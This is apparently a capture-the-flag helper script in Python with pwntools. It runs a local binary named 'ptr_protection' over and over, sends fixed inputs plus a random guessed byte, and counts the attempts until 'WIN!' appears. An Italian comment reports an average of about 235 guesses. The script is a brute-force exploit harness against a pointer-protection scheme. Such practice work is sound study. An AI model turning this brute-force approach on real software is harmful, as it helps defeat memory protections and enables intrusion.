from pwn import *
from sys import *
from random import *
import pandas as pd
import subprocess

BINARY = "./ptr_protection"
DIM = 1000

def run_process(binary_path):
    return subprocess.Popen(binary_path, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

# code
try:
    attempts = [0 for i in range(10000)]
    for i in range(DIM):
        print("ITERATION %d" % i)
        counter = 0
        while True:
            counter += 1
            r = run_process(BINARY)

            # Use r.stdin.write to send input to the process
            r.stdin.write(b"40\n")
            r.stdin.write(b"232\n")
            r.stdin.write(b"41\n")
            r.stdin.write(p64(randint(0, 255)) + b"\n")
            r.stdin.write(b"-1\n")
            r.stdin.flush()
            sleep(0.05)
            bytes = r.communicate()[0]

            if b"WIN!" in bytes:
                print("FOUND FLAG in ", counter, " attempts")
                attempts[counter] += 1
                break

            if "--remote" in sys.argv:
                r.terminate()
            else:
                r.kill()

except KeyboardInterrupt:
    print("writing results..")
    df = pd.DataFrame([attempts]).T
    df.to_excel(excel_writer="results.xlsx")
    exit()


'''
qui ho solo cercato di capire come si comportava in media il programma, da 205 estrazioni è emerso
che il numero medio di guess che deve fare è 235
'''